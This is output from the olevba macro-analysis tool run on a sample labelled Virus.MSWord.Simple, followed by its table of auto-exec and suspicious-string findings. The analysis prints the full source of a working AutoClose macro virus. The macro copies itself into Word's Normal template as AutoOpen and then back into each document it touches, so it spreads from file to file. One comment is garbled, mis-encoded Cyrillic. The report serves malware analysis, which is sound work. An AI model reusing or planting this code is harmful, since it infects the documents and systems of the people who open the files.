olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Simple
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Simple - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Simple - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub Main()
Dim Count_
Dim F
Dim i
Dim Name_$
Dim NameActiveFile$
Rem Êîë-âî ìàêðîêîìàíä â øàáëîíå Normal
    Count_ = WordBasic.CountMacros(0)
    F = 0
    For i = 1 To Count_
     Name_$ = WordBasic.[MacroName$](i, 0)
     If Name_$ = "AutoOpen" Then F = 1
    Next i
    NameActiveFile$ = WordBasic.[FileNameFromWindow$](0)
    If F = 0 Then WordBasic.MacroCopy NameActiveFile$ + ":AutoClose", "Normal:AutoOpen"
    If F = 1 Then WordBasic.FileSaveAs Name:=NameActiveFile$, Format:=1: WordBasic.MacroCopy "Normal:AutoOpen", NameActiveFile$ + ":AutoClose": WordBasic.FileSaveAs Name:=NameActiveFile$, Format:=1

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

